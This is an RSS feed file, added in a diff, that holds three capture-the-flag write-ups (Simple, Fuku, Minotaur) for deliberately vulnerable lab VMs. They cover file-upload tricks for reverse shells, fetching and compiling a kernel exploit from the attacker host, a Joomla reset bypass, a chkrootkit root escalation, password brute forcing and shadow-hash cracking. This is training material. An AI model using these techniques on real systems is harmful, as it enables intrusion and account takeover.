@@ -1,0 +1,564 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Sectalks on Cheesy Rumbles</title>
+    <link>http://rastamouse.me/categories/sectalks/</link>
+    <description>Recent content in Sectalks on Cheesy Rumbles</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sat, 16 Apr 2016 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://rastamouse.me/categories/sectalks/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>BNE0x03 - Simple</title>
+      <link>http://rastamouse.me/writeups/2016/simple/</link>
+      <pubDate>Sat, 16 Apr 2016 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2016/simple/</guid>
+      <description>
+
+&lt;h3 id=&#34;simple-ctf:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Simple CTF&lt;/h3&gt;
+
+&lt;p&gt;Simple CTF is a boot2root that focuses on the basics of web based hacking.  /root/flag.txt is your ultimate goal.&lt;/p&gt;
+
+&lt;h3 id=&#34;hints:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Hints&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Get a user shell by uploading a reverse shell and executing it.&lt;/li&gt;
+&lt;li&gt;A proxy may help you to upload the file you want, rather than the file that the server expects.&lt;/li&gt;
+&lt;li&gt;There are 3 known privesc exploits that work. Some people have had trouble executing one of them unless it was over a reverse shell using a netcat listener.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;discovery:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Discovery&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -p- -A 192.168.56.104
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Please Login / CuteNews
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;shell:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Shell&lt;/h2&gt;
+
+&lt;p&gt;CuteNews 2.0.3 has an arbitary file upload vulnerability, in the avatar function of a registered user.  I first registered an account as &lt;code&gt;rasta:mouse&lt;/code&gt; and logged in.  Navigate to &lt;code&gt;Personal options&lt;/code&gt; and select the &lt;code&gt;Browse&lt;/code&gt; button to upload an avatar.&lt;/p&gt;
+
+&lt;p&gt;I copied &lt;code&gt;/usr/share/webshells\php\php-reverse-shell.php&lt;/code&gt; to &lt;code&gt;/root/rasta.jpg&lt;/code&gt;, and changed the IP address for the callback.&lt;/p&gt;
+
+&lt;p&gt;Before the upload, open &lt;code&gt;burp&lt;/code&gt; and turn &lt;code&gt;intercept&lt;/code&gt; on.  When you upload your file, use &lt;code&gt;burp&lt;/code&gt; to change the extension of the filename to &lt;code&gt;php&lt;/code&gt;.  So it looks something like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;name=&amp;quot;avatar_file&amp;quot;; filename=&amp;quot;rasta.php
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Once the file has been uploaded, create a &lt;code&gt;netcat&lt;/code&gt; listener and execute your shell.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc -lnvp 1234
+listening on [any] 1234 ...
+
+root@kali:~# curl http://192.168.56.104/uploads/avatar_rasta_rasta.php
+
+connect to [192.168.56.102] from (UNKNOWN) [192.168.56.104] 52214
+Linux simple 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux
+ 08:01:39 up 37 min,  0 users,  load average: 0.00, 0.01, 0.03
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can&#39;t access tty; job control turned off
+$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;priv-esc:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Priv esc&lt;/h2&gt;
+
+&lt;p&gt;This VM is running Ubuntu 14.04.1, which has a kernel vulnerability that will take us straight to &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ uname -a
+Linux simple 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I used &lt;code&gt;python -m SimpleHTTPServer&lt;/code&gt; on my Kali box and used &lt;code&gt;wget&lt;/code&gt; to download the exploit source code.  &lt;code&gt;gcc&lt;/code&gt; is installed on the VM, so we can compile and run without issue.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ wget http://192.168.56.102:8000/x.c
+$ ls -l
+-rw-rw-rw- 1 www-data www-data 5123 Apr 16 06:20 x.c
+$ gcc x.c -o x
+$ ./x
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+sh: 0: can&#39;t access tty; job control turned off
+# whoami
+root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;flag:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Flag&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;# cat /root/flag.txt
+U wyn teh Interwebs!!1eleven11!!1!
+Hack the planet!
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>BNE0x02 - Fuku</title>
+      <link>http://rastamouse.me/writeups/2016/fuku/</link>
+      <pubDate>Fri, 15 Apr 2016 19:14:56 +0100</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2016/fuku/</guid>
+      <description>
+
+&lt;h3 id=&#34;fuku-ctf:4620d038ef80856257f87c289da6c889&#34;&gt;Fuku CTF&lt;/h3&gt;
+
+&lt;p&gt;Fuku (pronounced &amp;ldquo;far queue&amp;rdquo;) CTF is designed to fuck with people.&lt;/p&gt;
+
+&lt;p&gt;There are a few flag.txt files to grab. The final one is in the /root/ directory. However, the ultimate goal is to get a root shell.&lt;/p&gt;
+
+&lt;h3 id=&#34;scenario:4620d038ef80856257f87c289da6c889&#34;&gt;Scenario&lt;/h3&gt;
+
+&lt;p&gt;&amp;ldquo;Bull was pissed when you broke into his Minotaur box. He has taken precautions with another website that he is hosting, implementing IDS, whitelisting, and obfuscation techniques. He is now taunting hackers to try and hack him, believing himself to be safe. It is up to you to put him in his place.&amp;rdquo;&lt;/p&gt;
+
+&lt;h3 id=&#34;hints:4620d038ef80856257f87c289da6c889&#34;&gt;Hints&lt;/h3&gt;
+
+&lt;p&gt;Some scripting will probably be needed to find a useful port.
+If the machine seems to go down after a while, it probably hasn&amp;rsquo;t. This CTF isn&amp;rsquo;t called Fuku for nothing!&lt;/p&gt;
+
+&lt;p&gt;This VM was supremely fuckin annoying, as its IP address changes at regular intervals :)&lt;/p&gt;
+
+&lt;p&gt;We first find it at &lt;code&gt;192.168.56.102&lt;/code&gt;.  So let&amp;rsquo;s port scan it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -p- 192.168.56.102
+1/tcp     open  tcpmux
+2/tcp     open  compressnet
+3/tcp     open  compressnet
+4/tcp     open  unknown
+5/tcp     open  unknown
+6/tcp     open  unknown
+7/tcp     open  echo
+8/tcp     open  unknown
+9/tcp     open  discard
+10/tcp    open  unknown
+[...snip...]
+65526/tcp open  unknown
+65527/tcp open  unknown
+65528/tcp open  unknown
+65529/tcp open  unknown
+65530/tcp open  unknown
+65531/tcp open  unknown
+65532/tcp open  unknown
+65533/tcp open  unknown
+65534/tcp open  unknown
+65535/tcp open  unknown
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Every mother-humping port appears open!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc 192.168.56.102 80
+HTTP/1.0 200 OK
+Server: Apache/2.4.0 (Ubuntu)
+
+&amp;lt;html&amp;gt;
+&amp;lt;body&amp;gt;
+FUKU!&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+
+root@kali:~# nc 192.168.56.102 8080
+HTTP/1.0 200 OK
+Server: Apache/2.4.2 (Ubuntu)
+
+&amp;lt;html&amp;gt;
+&amp;lt;body&amp;gt;
+FUKU!&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+
+root@kali:~# nc 192.168.56.102 1234
+HTTP/1.0 200 OK
+Server: Apache/2.4.0 (Ubuntu)
+
+&amp;lt;html&amp;gt;
+&amp;lt;body&amp;gt;
+FUKU!&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I suspect this may be some &lt;code&gt;iptables&lt;/code&gt; magic, where it redirects every port to one on which Apache is listening.  I manually checked a few common ports to see if anything was hidding, all I found was &lt;code&gt;22&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc 192.168.56.102 22
+SSH-2.0-OpenSSH_6.7p1 Ubuntu-5ubuntu1
+
+Protocol mismatch.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I figured the easiest way to find something different between the ports, was to fetch the content of each one and compare the data sizes or something.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash
+
+for i in {1..65535}; do
+
+	wget 192.168.56.131:$i -q -O $i -t 1 &amp;amp;
+
+done
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Be warned - this pretty much bricked my laptop :D and obviously half way through the scan the IP address changed!!!  Eventually, I got some results.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/fuku# ls -lS | head
+total 256612
+-rw-r--r-- 1 root root 14179 Apr 15 20:06 13370
+-rw-r--r-- 1 root root    58 Apr 15 20:06 22
+-rw-r--r-- 1 root root    37 Apr 15 20:06 1
+-rw-r--r-- 1 root root    37 Apr 15 20:06 10
+-rw-r--r-- 1 root root    37 Apr 15 20:06 100
+-rw-r--r-- 1 root root    37 Apr 15 20:06 10000
+-rw-r--r-- 1 root root    37 Apr 15 20:06 10001
+-rw-r--r-- 1 root root    37 Apr 15 20:06 10002
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Reading the dump for port &lt;code&gt;13370&lt;/code&gt;, we can see this is an installation of Jooma.  We can hop over in a browser for confirmation, and we see a lovely Japanese Rick Roll rendition.&lt;/p&gt;
+
+&lt;h2 id=&#34;joomla:4620d038ef80856257f87c289da6c889&#34;&gt;Joomla&lt;/h2&gt;
+
+&lt;p&gt;The version of Joomla installed is &lt;code&gt;1.5.0&lt;/code&gt;, which has a remote admin password change vulnerability.  So we can navigate to &lt;code&gt;/index.php?option=com_user&amp;amp;view=reset&amp;amp;layout=confirm&lt;/code&gt;, pop a &lt;code&gt;&#39;&lt;/code&gt; in the text box and we&amp;rsquo;re free to set any new password we wish.&lt;/p&gt;
+
+&lt;p&gt;We can then navigate to &lt;code&gt;/administrator&lt;/code&gt; and log in with our new creds; then get a PHP shell by uploading a backdoor into the template source code and requesting the page.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/fuku/joomla-admin.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;I just used &lt;code&gt;/usr/share/webshells/php/php-reverse-shell.php&lt;/code&gt; for this.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/fuku# nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [192.168.56.101] from (UNKNOWN) [192.168.56.124] 40273
+haha! FUKU! Only root can run that command.
+ 05:38:31 up  1:14,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+haha! FUKU! Only root can run that command.
+/bin/sh: 0: can&#39;t access tty; job control turned off
+$ id
+haha! FUKU! Only root can run that command.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It seems there&amp;rsquo;s some limitation going on with what commands we can run, which might get interesting.&lt;/p&gt;
+
+&lt;h2 id=&#34;flag-1:4620d038ef80856257f87c289da6c889&#34;&gt;Flag 1&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ cat /var/www/html/flag.txt
+Did you find this flag by guessing? Or possibly by looking in the robots.txt file?
+Maybe you found it after getting a shell, by using a command like &amp;quot;find / -name flag.txt&amp;quot; ?
+Random keyboard smash: J7&amp;amp;fVbh2kTy[JgS&amp;quot;98$vF4#;&amp;gt;mGcT
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;priv-esc:4620d038ef80856257f87c289da6c889&#34;&gt;Priv Esc&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ps aux
+root      1442  0.0  0.5   5732  2744 ?        S    04:24   0:00 /bin/bash /root/chkrootkit-0.49/run_chkrootkit
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After a quick Google, we learn that there&amp;rsquo;s a pretty dumb vulnerability in this version of &lt;code&gt;chkrootkit&lt;/code&gt;.  It will basically execute &lt;code&gt;/tmp/update&lt;/code&gt; as &lt;code&gt;root&lt;/code&gt;.  All we must do is place a script/binary there.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ echo &amp;quot;#!/bin/sh&amp;quot;&amp;gt;&amp;gt;update
+$ echo &amp;quot;cp /bin/sh /tmp/sh&amp;quot;&amp;gt;&amp;gt;update
+$ echo &amp;quot;chmod 7777 /tmp/sh&amp;quot;&amp;gt;&amp;gt;update
+$ chmod +x update
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;A few minutes later&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-rwsrwsrwt 1 root     root     112204 Apr 16 06:04 sh
+
+$ ./sh
+cd /root
+ls -l
+
+-rw------- 1 root root       122 Jan  1  1970 flag.txt
+
+cat flag.txt
+Yep, this is a flag. It&#39;s worth over 9000 Internet points!
+Random keyboard smash: lkhI6u%RdFEtDjJKIuuiI7i&amp;amp;*iuGf)8$d4gfh%4
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>BNE0x00 - Minotaur</title>
+      <link>http://rastamouse.me/writeups/2016/minotaur/</link>
+      <pubDate>Fri, 15 Apr 2016 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2016/minotaur/</guid>
+      <description>
+
+&lt;h3 id=&#34;minotaur-ctf:130852a9ee39e601e939903b24e77be6&#34;&gt;Minotaur CTF&lt;/h3&gt;
+
+&lt;p&gt;Minotaur is a boot2root CTF. There are a few flag.txt files around to grab. /root/flag.txt is your ultimate goal.&lt;/p&gt;
+
+&lt;h3 id=&#34;hints:130852a9ee39e601e939903b24e77be6&#34;&gt;Hints&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;This CTF has a couple of fairly heavy password cracking challenges, and some red herrings.&lt;/li&gt;
+&lt;li&gt;One password you will need is not on rockyou.txt or any other wordlist you may have out there. So you need to think of a way to generate it yourself.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;enumeration:130852a9ee39e601e939903b24e77be6&#34;&gt;Enumeration&lt;/h2&gt;
+
+&lt;p&gt;After spinning up the VM and doing an ARP scan, we find it at &lt;code&gt;192.168.56.223&lt;/code&gt;.  A port scan shows 3 ports available:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 ed:74:0c:c9:21:c4:58:47:d4:02:89:c7:e5:3e:09:18 (DSA)
+|   2048 0c:4b:a8:24:7e:fc:cd:8a:b1:9f:87:dd:9d:06:30:05 (RSA)
+|_  256 40:9b:fe:f9:82:41:17:93:a2:96:34:25:1c:53:bb:ae (ECDSA)
+80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+2020/tcp open  ftp     vsftpd 2.0.8 or later
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There doesn&amp;rsquo;t appear to be anything within the FTP share, so let&amp;rsquo;s enumerate Apache a bit more.  There don&amp;rsquo;t appear to be any custom comments/changes to the default page, so directory scanning is a next logical step.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt --sc 200 http://192.168.56.223/FUZZ/
+********************************************************
+* Wfuzz 2.1.3 - The Web Bruteforcer                      *
+********************************************************
+
+Target: http://192.168.56.223/FUZZ/
+Total requests: 3036
+
+==================================================================
+ID	Response   Lines      Word         Chars          Request    
+==================================================================
+
+00477:  C=200    321 L	     862 W	  16057 Ch	  &amp;quot;bull&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Here, we find a &amp;lsquo;Bull Blog&amp;rsquo;, powered by Wordpress.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/minotaur/bulls.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;h2 id=&#34;wordpress:130852a9ee39e601e939903b24e77be6&#34;&gt;Wordpress&lt;/h2&gt;
+
+&lt;p&gt;&lt;code&gt;wpscan&lt;/code&gt; is my defacto tool for scanning Wordpress.  &lt;code&gt;root@kali:~# wpscan -u http://192.168.56.223/bull/&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;This spits out 12 potential vulnerabilities, most of them being XSS.  The most promising looking one is a &lt;code&gt;Slideshow Gallery &amp;lt; 1.4.7 Arbitrary File Upload&lt;/code&gt;.  However, we do need some valid credentials to do this. &lt;code&gt;wpscan&lt;/code&gt; can enumerate users for us, which is half the battle.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;    +----+-------+-------+
+    | Id | Login | Name  |
+    +----+-------+-------+
+    | 1  | bully | bully |
+    +----+-------+-------+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now, this is where that second hint comes into play - a password we aren&amp;rsquo;t likely to find in an existing wordlist.  I generated my own password list using &lt;code&gt;CeWL&lt;/code&gt; and &lt;code&gt;john&lt;/code&gt; - a technique I learnt way back in &lt;a href=&#34;writeups/2014/hell-1-part-1/&#34;&gt;Hell&lt;/a&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/minotaur# cewl -m 5 -w bulls http://192.168.56.223/bull/
+root@kali:~/minotaur# wc -l bulls 
+315 bulls
+root@kali:~/minotaur# john --wordlist=bulls --rules --stdout &amp;gt;&amp;gt; bulls 
+root@kali:~/minotaur# wc -l bulls 
+14590 bulls
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;That&amp;rsquo;s a lot of bulls :)&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;wpscan&lt;/code&gt; can also bruteforce the password for us, which is nice as we don&amp;rsquo;t have to screw around with &lt;code&gt;hydra&lt;/code&gt; or &lt;code&gt;medusa&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/minotaur# wpscan -u http://192.168.56.223/bull/ -w /root/minotaur/bulls --username bully --threads 50
+
+[+] Starting the password brute forcer
+  Brute Forcing &#39;bully&#39; Time: 00:03:32 &amp;lt;=======================================================================        &amp;gt; (13331 / 14591) 91.36%  ETA: 00:00:20
+  [+] [SUCCESS] Login : bully Password : Bighornedbulls
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I manually logged in just to make sure they worked, and I also noted that this was an admin account (which was fairly predictable due to its ID).  But it does mean that we don&amp;rsquo;t actually need to exploit the Slideshow Gallery vulnerability, as we can just upload a PHP Shell via this admin panel.&lt;/p&gt;
+
+&lt;h2 id=&#34;shell:130852a9ee39e601e939903b24e77be6&#34;&gt;Shell&lt;/h2&gt;
+
+&lt;p&gt;I&amp;rsquo;ll just use the &lt;code&gt;exploit/unix/webapp/wp_admin_shell_upload&lt;/code&gt; Metasploit module for this.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msf exploit(wp_admin_shell_upload) &amp;gt; exploit 
+
+[*] Started reverse TCP handler on 192.168.56.101:4444 
+[*] Authenticating with WordPress using bully:Bighornedbulls...
+[+] Authenticated with WordPress
+[*] Preparing payload...
+[*] Uploading payload...
+[*] Executing the payload at /bull/wp-content/plugins/JthxXkaTsb/zQvuEhlHdT.php...
+[*] Sending stage (33684 bytes) to 192.168.56.223
+[*] Meterpreter session 1 opened (192.168.56.101:4444 -&amp;gt; 192.168.56.223:53478) at 2016-04-15 17:08:46 +0100
+[+] Deleted zQvuEhlHdT.php
+[+] Deleted JthxXkaTsb.php
+
+meterpreter &amp;gt; sysinfo 
+Computer    : minotaur
+OS          : Linux minotaur 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686
+Meterpreter : php/php
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;flag-1:130852a9ee39e601e939903b24e77be6&#34;&gt;Flag 1&lt;/h2&gt;
+
+&lt;p&gt;The VM description told us that there are multiple flags, the first of which is found in the webroot.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; cat /var/www/html/flag.txt
+Oh, lookey here. A flag!
+Th15 15 @N 3@5y f1@G!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;flag-2:130852a9ee39e601e939903b24e77be6&#34;&gt;Flag 2&lt;/h2&gt;
+
+&lt;p&gt;The second flag is found in the &lt;code&gt;/tmp&lt;/code&gt; directory, along with a priv-esc opportunity.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; ls /tmp
+
+100640/rw-r-----  121   fil   2015-05-27 03:47:45 +0100  flag.txt
+100640/rw-r-----  1148  fil   2015-05-27 07:47:30 +0100  shadow.bak
+
+meterpreter &amp;gt; cat /tmp/flag.txt
+That shadow.bak file is probably useful, hey?
+Also, you found a flag!
+My m1L|&amp;lt;$|-|@|&amp;lt;3 br1|\|G$ @11 t3h b0y$ 2 t3h y@R|)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;root:130852a9ee39e601e939903b24e77be6&#34;&gt;root&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; download /tmp/shadow.bak
+[*] downloading: /tmp/shadow.bak -&amp;gt; shadow.bak
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I extracted the hashes for &lt;code&gt;root&lt;/code&gt;, &lt;code&gt;minotaur&lt;/code&gt;, &lt;code&gt;heffer&lt;/code&gt; and &lt;code&gt;h0rnbag&lt;/code&gt; and ran them through &lt;code&gt;john&lt;/code&gt;.  I got one hit pretty quickly.  &lt;code&gt;Password1        (heffer)&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;I was able to use these creds and login over SSH and retrieve his flag.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/minotaur# ssh heffer@192.168.56.223
+
+heffer@minotaur:~$ ls -l
+
+-rw------- 1 heffer heffer 107 May 27  2015 flag.txt
+
+heffer@minotaur:~$ cat flag.txt 
+So this was an easy flag to get, hopefully. Have you gotten ~minotaur/flag.txt yet?
+Th3 fl@G 15: m00000 y0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This user has a sudo entry, but it doesn&amp;rsquo;t seem to work.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;heffer@minotaur:~$ sudo -l
+
+User heffer may run the following commands on minotaur:
+    (root) NOPASSWD: /root/bullquote.sh
+
+heffer@minotaur:~$ sudo /root/bullquote.sh
+[sudo] password for heffer: 
+sudo: /root/bullquote.sh: command not found
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In the time I was poking around here, I got a second password from &lt;code&gt;john&lt;/code&gt;:  &lt;code&gt;obiwan6          (minotaur)&lt;/code&gt;.  I did a quick &lt;code&gt;su&lt;/code&gt; and collected &lt;code&gt;minotaur&lt;/code&gt;&amp;rsquo;s flag.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;heffer@minotaur:~$ su minotaur
+Password: 
+minotaur@minotaur:/home/heffer$ cd
+minotaur@minotaur:~$ ls -l
+-rw------- 1 minotaur minotaur  107 May 27  2015 flag.txt
+drwxr-xr-x 4 minotaur minotaur 4096 May 27  2015 peda
+
+minotaur@minotaur:~$ cat flag.txt 
+Congrats! You&#39;ve found the first flag:
+M355 W17H T3H 8ULL, G37 73H H0RN!
+
+But can you get /root/flag.txt ?
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;minotaur&lt;/code&gt; is able to run ALL as &lt;code&gt;root&lt;/code&gt;.  Which makes elevation to &lt;code&gt;root&lt;/code&gt; nice and easy.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;minotaur@minotaur:~$ sudo -l
+
+User minotaur may run the following commands on minotaur:
+    (root) NOPASSWD: /root/bullquote.sh
+    (ALL : ALL) ALL
+
+minotaur@minotaur:~$ sudo -i
+[sudo] password for minotaur: 
+root@minotaur:~# 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;final-flag:130852a9ee39e601e939903b24e77be6&#34;&gt;Final Flag&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@minotaur:~# ls -l
+-rw------- 1 root root   70 May 27  2015 flag.txt
+drwxr-xr-x 4 root root 4096 May 27  2015 peda
+-rwx------ 1 root root  845 May 15  2015 quotes.txt
+
+root@minotaur:~# cat flag.txt 
+Congrats! You got the final flag!
+Th3 Fl@g is: 5urr0nd3d bY @r$3h0l35
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
